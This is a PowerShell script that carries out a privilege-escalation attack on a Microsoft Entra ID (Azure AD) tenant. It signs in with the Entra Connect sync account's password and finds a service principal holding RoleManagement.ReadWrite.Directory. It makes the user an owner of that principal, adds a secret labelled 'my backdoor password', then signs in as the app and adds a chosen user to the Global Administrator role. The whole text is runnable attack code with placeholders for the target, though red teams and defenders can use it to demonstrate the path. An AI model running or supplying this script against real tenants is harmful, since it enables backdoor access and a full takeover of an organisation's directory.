# Change the following information to match your tenant
$TenantId = "TENANT_ID_HERE"
$UserToMakeGlobalAdmin = "USER_OBJECT_ID_HERE"
$AADUserUPN = "Sync_USERNAME@MYDOMAIN.onmicrosoft.com"
$AADUserPassword = "xxxx"

# Define APIs and attack path description
$DangerousAPIPermissions = @(
    "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" # RoleManagement.ReadWrite.Directory 
)


#region Initial access using username and password of the Entra ID (Azure AD) connect user
$body = @{
    client_id  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    scope      = "https://graph.microsoft.com/.default offline_access openid"
    username   = $AADUserUPN
    password   = $AADUserPassword
    grant_type = "password"
}

$connection = Invoke-RestMethod `
    -Uri https://login.microsoftonline.com/$($TenantId)/oauth2/v2.0/token `
    -Method POST `
    -Body $body

$AuthHeader = @{
    Authorization = "Bearer $($connection.access_token)"
}
#endregion


#region Auto detect RoleManagement.ReadWrite.Directory application
Write-Output "Auto detect RoleManagement.ReadWrite.Directory application"
$TenantApplications = Invoke-RestMethod -Headers $AuthHeader -Uri "https://graph.microsoft.com/v1.0/applications" -Method GET

Write-Output "Get all service principals AND ignore apps with servicePrincipalLockConfiguration turned on"
$appsWithServicePrincipals = ForEach ($app in ($TenantApplications.value) ) {
    $lockConfig = $app.servicePrincipalLockConfiguration.isEnabled
    #if(($lockConfig -eq $false) -or ($lockConfig -eq $null)) {
        $appId = $app.appId
        @{
            appObjId = $app.id
            ServicePrincipalIds = Invoke-RestMethod -Headers $AuthHeader -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/?`$filter=(appid eq '$appId')" | Select-Object -ExpandProperty value | Select-Object -ExpandProperty id
        }
    #}
}

Write-Output "Get all role assignments"
$appRoleAssignments = foreach ($app in $appsWithServicePrincipals) {
    foreach ($SPId in $app.ServicePrincipalIds) {
        $roleAssignments = Invoke-RestMethod -Headers $AuthHeader -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$SPId/appRoleAssignments"
        if ($roleAssignments.value) {
        @{
            appObjId = $app.appObjId
            roleAssignments = $roleAssignments.value
}
        }
    }
}

Write-Output "List all applications that have any of these permissions granted"
$vulnerableApps = foreach ($currRoleAssignment in $appRoleAssignments) {
    foreach ($roleId in $currRoleAssignment.roleAssignments | Where-Object {$_.appRoleId -in $DangerousAPIPermissions}) {
        $currRoleAssignment
    }
}

if (($vulnerableApps -eq $null) -or ($vulnerableApps.Count -eq 0)) {
 Write-Error "No vulnerable service principals detected."
    $GoAhead = $false
} else {
 Write-Output "Found $($vulnerableApps.Count) vulnerable service principal(s)"
    $appToTakeOver = $vulnerableApps | Select-Object -First 1
    $ServicePrincipalToTakeover = $appToTakeOver.roleAssignments | Select-Object -First 1 -ExpandProperty principalId
    $GoAhead = $true
}
#endregion

if ($GoAhead) {
    Write-Output "Get basic information about the service principal and current user"
    $AppInformation = Invoke-RestMethod -Method Get -Headers $AuthHeader -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$ServicePrincipalToTakeover"
    $AADUser = Invoke-RestMethod -Method Get -Headers $AuthHeader -Uri "https://graph.microsoft.com/v1.0/users/$AADUserUPN"

    Write-Output "Add current user as owner of application"
    $req_body = @{ "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/" + $AADUser.id } | ConvertTo-Json
    Invoke-RestMethod -Method Post -Headers $AuthHeader -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$ServicePrincipalToTakeover/owners/`$ref" -Body $req_body -ContentType "application/json" | Out-Null

    Write-Output "Add new password based secret"
    $req_body = @{ "passwordCredential" = @{"displayName" = "my backdoor password"}} | ConvertTo-Json
    $NewCredential = Invoke-RestMethod -Method Post -Headers $AuthHeader -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$ServicePrincipalToTakeover/addPassword" -Body $req_body -ContentType "application/json"
    Write-Output "New credentials: " + $NewCredential | Out-String

    Write-Output "Wait 15 seconds to allow new credentials to be propogated..."
    Start-Sleep 15

    Write-Output "Sign in using the newly created secret and app id: $($AppInformation.appId)"
    $body = @{
        Grant_Type    = "client_credentials"
        Scope         = "https://graph.microsoft.com/.default"
        Client_Id     = $AppInformation.appId
        Client_Secret = $NewCredential.secretText
    }
    $AppConnection = Invoke-RestMethod `
        -Uri https://login.microsoftonline.com/$($AppInformation.appOwnerOrganizationId)/oauth2/v2.0/token `
        -Method POST `
        -Body $body

    # Create a new auth header for the application based sign in
    $AppAuthHeader = @{
        Authorization = "Bearer $($AppConnection.access_token)"
    }

    Write-Output "Add new user to global admin"
    $req_body = @{ "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/" + $UserToMakeGlobalAdmin } | ConvertTo-Json
    $Result = Invoke-RestMethod -Method Post -Headers $AppAuthHeader -Uri "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref" -Body $req_body -ContentType "application/json"
    $Result

    Write-Output "Done"
}